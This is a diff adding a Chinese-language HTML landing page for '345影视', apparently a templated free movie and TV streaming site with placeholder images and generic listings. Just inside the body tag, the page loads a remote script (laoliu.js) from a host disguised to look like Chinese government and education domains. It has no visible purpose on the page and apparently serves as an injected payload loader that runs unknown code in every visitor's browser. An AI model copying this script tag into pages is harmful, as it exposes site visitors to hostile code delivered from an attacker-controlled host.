@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>345影视 - 高清电影电视剧在线观看</title>
+<meta name="description" content="345影视(345yingshi-h5.github.io)提供最新电影、热播电视剧、动漫、综艺在线高清观看，海量资源每日更新，免费流畅。" />
+<meta name="keywords" content="345影视,345yingshi-h5,在线电影,电视剧,免费影视" />
+<style>
+/* ===== 基础重置 ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",sans-serif;
+  background:#080a14;
+  color:#e8ecf3;
+  line-height:1.7;
+}
+img{max-width:100%;display:block;}
+a{color:#38e1c4;text-decoration:none;}
+
+/* ===== 顶部栏 ===== */
+.topbar{
+  position:sticky;top:0;z-index:1000;
+  background:rgba(8,10,20,.85);
+  backdrop-filter:blur(12px);
+  border-bottom:1px solid rgba(56,225,196,.2);
+}
+.topbar-inner{
+  max-width:1120px;margin:0 auto;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 20px;
+}
+.brand{
+  font-size:24px;font-weight:900;letter-spacing:2px;
+  background:linear-gradient(90deg,#38e1c4,#4f8cff);
+  -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;
+}
+.topbar nav{display:flex;gap:24px;}
+.topbar nav a{font-size:15px;font-weight:600;transition:.2s;}
+.topbar nav a:hover{color:#fff;}
+
+/* ===== 通用区块 ===== */
+.wrap{max-width:1120px;margin:0 auto;padding:70px 20px;}
+.sec-title{
+  font-size:26px;font-weight:800;margin-bottom:8px;
+  display:flex;align-items:center;gap:10px;
+}
+.sec-title::before{
+  content:"";width:5px;height:24px;border-radius:3px;
+  background:linear-gradient(#38e1c4,#4f8cff);
+}
+.sec-desc{color:#8b93a7;margin-bottom:32px;font-size:14px;}
+
+/* ===== Hero ===== */
+.hero{
+  display:grid;grid-template-columns:1.1fr .9fr;
+  gap:50px;align-items:center;padding-top:100px;padding-bottom:60px;
+}
+.hero h1{font-size:44px;font-weight:900;line-height:1.25;margin-bottom:18px;}
+.hero h1 span{
+  background:linear-gradient(90deg,#38e1c4,#4f8cff);
+  -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;
+}
+.hero p{color:#a8aec4;margin-bottom:28px;font-size:16px;}
+.btn{
+  display:inline-block;padding:14px 34px;border-radius:40px;
+  background:linear-gradient(90deg,#38e1c4,#4f8cff);
+  color:#080a14;font-weight:800;font-size:15px;
+}
+.hero-card{
+  border-radius:20px;overflow:hidden;position:relative;
+  box-shadow:0 30px 60px rgba(56,225,196,.15);
+}
+.hero-card img{height:340px;object-fit:cover;width:100%;}
+
+/* ===== 热播榜（左图右文列表） ===== */
+.rank-list{display:flex;flex-direction:column;gap:16px;}
+.rank-item{
+  display:grid;grid-template-columns:48px 120px 1fr;
+  gap:18px;align-items:center;
+  background:rgba(255,255,255,.03);
+  border:1px solid rgba(255,255,255,.06);
+  border-radius:14px;padding:12px 16px;
+  transition:.25s;
+}
+.rank-item:hover{transform:translateX(6px);border-color:rgba(56,225,196,.5);}
+.rank-no{
+  font-size:26px;font-weight:900;color:#8b93a7;text-align:center;
+}
+.rank-item:nth-child(1) .rank-no{color:#ffd24f;}
+.rank-item:nth-child(2) .rank-no{color:#c0c6d6;}
+.rank-item:nth-child(3) .rank-no{color:#e09060;}
+.rank-cover{width:120px;height:70px;border-radius:8px;object-fit:cover;}
+.rank-info h3{font-size:16px;margin-bottom:4px;}
+.rank-info p{font-size:13px;color:#8b93a7;}
+
+/* ===== 频道分类（图标卡片） ===== */
+.channel-grid{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;
+}
+.channel{
+  padding:28px 22px;border-radius:16px;text-align:center;
+  background:linear-gradient(160deg,rgba(56,225,196,.1),rgba(79,140,255,.05));
+  border:1px solid rgba(56,225,196,.18);
+}
+.channel .ico{font-size:38px;margin-bottom:12px;}
+.channel h3{font-size:18px;margin-bottom:6px;}
+.channel p{font-size:13px;color:#8b93a7;}
+
+/* ===== 观影指南 ===== */
+.guide{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:20px;
+}
+.guide-card{
+  background:#0d111f;border-radius:14px;padding:26px 22px;
+  border-left:4px solid #38e1c4;
+}
+.guide-card:nth-child(2){border-left-color:#4f8cff;}
+.guide-card:nth-child(3){border-left-color:#ffd24f;}
+.guide-card h3{font-size:17px;margin-bottom:8px;}
+.guide-card p{font-size:14px;color:#a8aec4;}
+
+/* ===== 页脚 ===== */
+footer{
+  border-top:1px solid rgba(255,255,255,.06);
+  padding:30px 20px;text-align:center;color:#6b7288;font-size:13px;
+}
+
+/* ===== 移动端 ===== */
+@media(max-width:768px){
+  .topbar nav{gap:14px;}
+  .topbar nav a{font-size:13px;}
+  .hero{grid-template-columns:1fr;padding-top:80px;}
+  .hero h1{font-size:30px;}
+  .rank-item{grid-template-columns:40px 90px 1fr;gap:12px;}
+  .rank-cover{width:90px;height:56px;}
+  .hero-card img{height:240px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 顶部栏 -->
+<header class="topbar">
+  <div class="topbar-inner">
+    <div class="brand">345影视</div>
+    <nav>
+      <a href="#">首页</a>
+      <a href="#rank">热播榜</a>
+      <a href="#channel">频道</a>
+      <a href="#guide">观影指南</a>
+    </nav>
+  </div>
+</header>
+
+<!-- 首页 Hero -->
+<section class="wrap hero">
+  <div>
+    <h1>精彩大片<br /><span>尽在 345影视</span></h1>
+    <p>345影视（345yingshi-h5.github.io）汇聚院线大片、热播剧集、高分动漫与综艺，每日更新，高清流畅，随时随地畅快观影。</p>
+    <a class="btn" href="#rank">立即探索</a>
+  </div>
+  <div class="hero-card">
+    <img src="https://via.placeholder.com/600x500" alt="345影视精选封面" />
+  </div>
+</section>
+
+<!-- 热播榜 -->
+<section class="wrap" id="rank">
+  <h2 class="sec-title">热播榜</h2>
+  <p class="sec-desc">实时更新的高人气影视内容</p>
+  <div class="rank-list">
+    <div class="rank-item">
+      <div class="rank-no">1</div>
+      <img class="rank-cover" src="https://via.placeholder.com/240x140" alt="榜单影片" />
+      <div class="rank-info"><h3>热血动作大片</h3><p>2026 院线热映 · 9.2分</p></div>
+    </div>
+    <div class="rank-item">
+      <div class="rank-no">2</div>
+      <img class="rank-cover" src="https://via.placeholder.com/240x140" alt="榜单影片" />
+      <div class="rank-info"><h3>悬疑烧脑剧集</h3><p>高分口碑 · 全季完结</p></div>
+    </div>
+    <div class="rank-item">
+      <div class="rank-no">3</div>
+      <img class="rank-cover" src="https://via.placeholder.com/240x140" alt="榜单影片" />
+      <div class="rank-info"><h3>治愈系动漫</h3><p>最新话已更新</p></div>
+    </div>
+    <div class="rank-item">
+      <div class="rank-no">4</div>
+      <img class="rank-cover" src="https://via.placeholder.com/240x140" alt="榜单影片" />
+      <div class="rank-info"><h3>爆笑综艺秀</h3><p>明星阵容 · 欢乐不断</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 频道分类 -->
+<section class="wrap" id="channel">
+  <h2 class="sec-title">频道分类</h2>
+  <p class="sec-desc">按类型快速找到你想看的</p>
+  <div class="channel-grid">
+    <div class="channel"><div class="ico">🎬</div><h3>电影</h3><p>院线大片 / 经典老片</p></div>
+    <div class="channel"><div class="ico">📺</div><h3>电视剧</h3><p>国产 / 美剧 / 韩剧</p></div>
+    <div class="channel"><div class="ico">🌸</div><h3>动漫</h3><p>日漫 / 国漫</p></div>
+    <div class="channel"><div class="ico">🎤</div><h3>综艺</h3><p>真人秀 / 选秀</p></div>
+  </div>
+</section>
+
+<!-- 观影指南 -->
+<section class="wrap" id="guide">
+  <h2 class="sec-title">观影指南</h2>
+  <p class="sec-desc">关于 345影视 的服务说明</p>
+  <div class="guide">
+    <div class="guide-card"><h3>每日更新</h3><p>紧跟播出节奏，最新资源第一时间上线。</p></div>
+    <div class="guide-card"><h3>高清流畅</h3><p>多线路播放，清晰稳定，告别卡顿。</p></div>
+    <div class="guide-card"><h3>免费观看</h3><p>无需注册，打开即看，轻松追剧。</p></div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+  © 2026 345影视 | 345yingshi-h5.github.io | 本网站仅供学习与交流使用
+</footer>
+
+</body>
+</html>
